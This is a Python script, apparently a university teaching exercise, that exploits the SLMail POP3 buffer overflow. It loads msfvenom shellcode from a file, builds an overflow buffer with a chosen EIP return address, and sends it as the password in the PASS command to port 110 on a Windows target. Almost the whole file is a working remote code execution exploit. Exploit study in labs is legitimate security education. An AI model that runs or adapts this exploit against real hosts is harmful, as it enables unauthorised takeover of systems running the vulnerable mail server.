#!/usr/bin/env python

'''This script allows you to experiment with exploiting
   the SLMail buffer overflow vulnerability.

    Anyone is free to copy, modify, publish, use, compile, or
    distribute this software, in source code form only,
    for any non-commercial or academic purposes.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
    MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
    IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
    OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
    ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
    OTHER DEALINGS IN THE SOFTWARE.
'''

import socket
import argparse

__author__ = "Phil Ventura, Ph.D."
__copyright__ = "Copyright 2017, Phil Ventura, Ph.D."
__email__ = "pventura@usf.edu"

# This is a function definition in Python
def get_shellcode(filename):
    '''Reads the shellcode in the given filename generated by msfvenom using the c format
       and extracts just the shellcode without extraneous characters
    '''
    with open(filename, 'r') as shellcodefile:  # open the shellcode file for reading
        # slurp it in, and remove unwanted chars
        # split on \x to isolate just the hex char codes
        # filter to throw away any empty strings
        num_strs = filter(lambda s: len(s) > 0, shellcodefile.read().replace('\n', '').replace('"', '').replace('unsigned char buf[] = ', '').replace(';','').split(r'\x'))
    # convert the string hex value into the character it represents
    # and join them all together in one big shellcode string 
    return ''.join(map(lambda n: chr(int(n,16)), num_strs))
# end of function get_shellcode
#----------------------------------------------------------------------

# Setup the parser for the command line parameters,
# and add the parameters (arguments)
parser = argparse.ArgumentParser()
parser.add_argument("windoze_ip", help='ip address of the Windows target machine')
parser.add_argument("shellcode_filename", help='name of the file holding the shellcode')
parser.add_argument('-r', '--ret_addr', help='return address to insert into EIP, remember to use like $\'\\x63\\x79\\x4b\\x5f\'')
# TODO: Add a named optional parameter named -r (short form)
#       and --ret_addr (long form) to take the return address that the EIP will be set to
#       the help message should be
#       'return address to insert into EIP, remember to use like $\'\\x63\\x79\\x4b\\x5f\''
#parser.add_argument('-n', '--nops', help='number of nops, defaults to 16', type=int)
args = parser.parse_args()

shellcode = get_shellcode(args.shellcode_filename)
print "Size of shellcode:", len(shellcode)

# Default value of num_nops
#num_nops = 16
#if args.nops:
#    num_nops = args.nops
#print 'Number of nops:', num_nops
ret_addr = '\x63\x79\x4b\x5f'
if args.ret_addr:
	ret_addr = args.ret_addr
# TODO: Here is the default return address
# You will need to set this to the named optional parameter (if provided)
# see how num_nops is handled above


buffer = 'A' * 2606 + ret_addr + shellcode + 'C' * (3500-2606-4-len(shellcode))

try:
    print "\nSending evil buffer..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((args.windoze_ip, 110))
    s.recv(1024) # throw away prompt
    s.send('USER test\r\n')
    s.recv(1024) # throw away response/prompt
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
    s.close()
except:
    print "Could not connect to POP3!"

